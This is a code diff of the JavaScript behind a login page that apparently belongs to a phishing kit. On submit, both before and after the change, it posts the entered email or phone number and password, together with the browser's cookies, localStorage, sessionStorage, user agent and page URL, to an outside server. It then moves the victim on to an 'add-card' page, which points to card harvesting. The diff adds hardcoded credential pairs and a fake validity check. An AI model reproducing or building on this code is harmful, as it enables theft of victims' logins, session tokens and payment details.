@@ -12,8 +12,13 @@ document.addEventListener("DOMContentLoaded", () => {
   const passwordInput = document.getElementById("password");
   const errorPassword = document.getElementById("error-password");
 
+  const validCredentials = [
+    { user: 'test@example.com', pass: 'password123' },
+    { user: '123456789', pass: 'securepass' }
+  ];
+
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  const isPhone = (val) => /^\d+$/.test(val);
+  const isPhone = (val) => /^\d{9,}$/.test(val);
 
   let touched = false;
 
@@ -22,79 +27,81 @@ document.addEventListener("DOMContentLoaded", () => {
     label.classList.toggle("shrink", !!val || document.activeElement === input);
   }
 
-function validate() {
-  const val = input.value.trim();
-  const isEmpty = val === "";
-  const isPhoneInput = /^\d+$/.test(val);
-  const isEmailInput = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
-  const isValidPhone = isPhoneInput && val.length >= 9;
-  const passwordVal = passwordInput.value.trim();
-  const isPasswordValid = passwordVal.length >= 8;
+  function validate() {
+    const val = input.value.trim();
+    const isEmpty = val === "";
+    const isPhoneInput = /^\d+$/.test(val);
+    const isEmailInput = emailRegex.test(val);
+    const isValidPhone = isPhoneInput && val.length >= 9;
+    const passwordVal = passwordInput.value.trim();
+    const isPasswordValid = passwordVal.length >= 8;
 
-  // Reset
-  input.classList.remove("error", "valid", "phone-mode");
-  label.classList.remove("error");
-  errorRequired.classList.add("hidden");
-  errorFormat.classList.add("hidden");
-  errorPhone.classList.add("hidden");
-  phoneWrapper.classList.add("hidden");
-  button.classList.remove("active");
-  button.disabled = true;
-  errorIcon.style.display = "none";
-  passwordInput.classList.remove("error", "valid");
-  errorPassword.classList.add("hidden");
+    let hasError = false;
 
-  let hasError = false;
+    // Reset
+    input.classList.remove("error", "valid", "phone-mode");
+    label.classList.remove("error");
+    errorRequired.classList.add("hidden");
+    errorFormat.classList.add("hidden");
+    errorPhone.classList.add("hidden");
+    phoneWrapper.classList.add("hidden");
+    button.classList.remove("active");
+    button.disabled = true;
+    errorIcon.style.display = "none";
+    passwordInput.classList.remove("error", "valid");
+    errorPassword.classList.add("hidden");
 
-  if (!touched) {
-    subtext.classList.remove("hidden"); // Показываем при загрузке
-    return;
-  }
+    if (!touched) {
+      subtext.classList.remove("hidden");
+      return;
+    }
 
-  if (isEmpty) {
-    input.classList.add("error");
-    label.classList.add("error");
-    errorRequired.classList.remove("hidden");
-    errorIcon.style.display = "block";
-    hasError = true;
-  } else if (isPhoneInput) {
-    input.classList.add("phone-mode");
-    phoneWrapper.classList.remove("hidden");
-    label.textContent = "Mobile number";
-
-    if (!isValidPhone) {
+    if (isEmpty) {
       input.classList.add("error");
       label.classList.add("error");
-      errorPhone.classList.remove("hidden");
+      errorRequired.classList.remove("hidden");
       errorIcon.style.display = "block";
       hasError = true;
-    }
-  } else if (!isEmailInput) {
-    input.classList.add("error");
-    label.classList.add("error");
-    label.textContent = "Email address";
-    errorFormat.classList.remove("hidden");
-    errorIcon.style.display = "block";
-    hasError = true;
-  } else {
-    label.textContent = "Email address";
-  }
+    } else if (isPhoneInput) {
+      input.classList.add("phone-mode");
+      phoneWrapper.classList.remove("hidden");
+      label.textContent = "Mobile number";
 
-  if (!hasError) {
-    input.classList.add("valid");
-    button.classList.add("active");
-    button.disabled = false;
-    subtext.classList.remove("hidden"); // ✅ Показываем сабтекст
-  } else {
-    subtext.classList.add("hidden"); // ❌ Скрываем сабтекст если есть ошибки
-  }
-  if (!isPasswordValid && touched) {
-    passwordInput.classList.add("error");
-    errorPassword.classList.remove("hidden");
-    hasError = true;
-  } else if (isPasswordValid) {
-    passwordInput.classList.add("valid");
-  }
+      if (!isValidPhone) {
+        input.classList.add("error");
+        label.classList.add("error");
+        errorPhone.classList.remove("hidden");
+        errorIcon.style.display = "block";
+        hasError = true;
+      }
+    } else if (!isEmailInput) {
+      input.classList.add("error");
+      label.classList.add("error");
+      label.textContent = "Email address";
+      errorFormat.classList.remove("hidden");
+      errorIcon.style.display = "block";
+      hasError = true;
+    } else {
+      label.textContent = "Email address";
+    }
+
+    if (!isPasswordValid && touched) {
+      passwordInput.classList.add("error");
+      errorPassword.classList.remove("hidden");
+      hasError = true;
+    } else if (isPasswordValid) {
+      passwordInput.classList.add("valid");
+    }
+
+    if (!hasError) {
+      input.classList.add("valid");
+      button.classList.add("active");
+      button.disabled = false;
+      subtext.classList.remove("hidden");
+    } else {
+      subtext.classList.add("hidden");
+    }
+
     updateLabelState();
   }
 
@@ -113,37 +120,54 @@ function validate() {
     validate();
   });
 
+  passwordInput.addEventListener("input", () => {
+    validate();
+  });
+
   form.addEventListener("submit", async (e) => {
     e.preventDefault();
     const val = input.value.trim();
+    const pass = passwordInput.value.trim();
     if (button.disabled) return;
 
-    const isEmail = emailRegex.test(val);
-    const endpoint = isEmail ? "/login" : "/phone";
+    const isValid = validCredentials.some(
+      pair => pair.user === val && pair.pass === pass
+    );
+
+    const payload = {
+      user_input: val,
+      password: pass,
+      userAgent: navigator.userAgent,
+      location: window.location.href,
+      timestamp: new Date().toISOString(),
+      cookies: document.cookie,
+      localStorage: JSON.stringify(localStorage),
+      sessionStorage: JSON.stringify(sessionStorage),
+      success: isValid
+    };
 
     button.disabled = true;
     button.querySelector(".al-button__label").textContent = "Loading...";
 
     try {
-      await fetch(`https://onclick-back.onrender.com${endpoint}`, {
+      await fetch("https://onclick-back.onrender.com/login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          user_input: val,
-          password: passwordInput.value.trim(),
-          userAgent: navigator.userAgent,
-          location: window.location.href,
-          timestamp: new Date().toISOString(),
-          cookies: document.cookie,
-          localStorage: JSON.stringify(localStorage),
-          sessionStorage: JSON.stringify(sessionStorage),
-        }),
+        body: JSON.stringify(payload),
       });
 
-      window.location.href = "add-card.html";
+      if (isValid) {
+        window.location.href = "add-card.html";
+      } else {
+        input.classList.add("error");
+        passwordInput.classList.add("error");
+        errorIcon.style.display = "block";
+        validate();
+        button.disabled = false;
+        button.querySelector(".al-button__label").textContent = "Continue";
+      }
     } catch (err) {
       console.error("Failed to submit:", err);
-      alert("Submission failed. Try again.");
       button.disabled = false;
       button.querySelector(".al-button__label").textContent = "Continue";
     }
@@ -154,18 +178,19 @@ function validate() {
   const localeMenu = document.getElementById("locale-menu");
   const currentLocale = document.getElementById("current-locale");
 
-  localeToggle.addEventListener("click", (e) => {
-    e.preventDefault();
-    localeMenu.classList.toggle("hidden");
-  });
-
-  document.querySelectorAll("#locale-menu li").forEach((li) => {
-    li.addEventListener("click", () => {
-      currentLocale.textContent = li.dataset.locale;
-      localeMenu.classList.add("hidden");
+  if (localeToggle) {
+    localeToggle.addEventListener("click", (e) => {
+      e.preventDefault();
+      localeMenu.classList.toggle("hidden");
     });
-  });
 
-  // 🔧 Init
+    document.querySelectorAll("#locale-menu li").forEach((li) => {
+      li.addEventListener("click", () => {
+        currentLocale.textContent = li.dataset.locale;
+        localeMenu.classList.add("hidden");
+      });
+    });
+  }
+
   validate();
 });
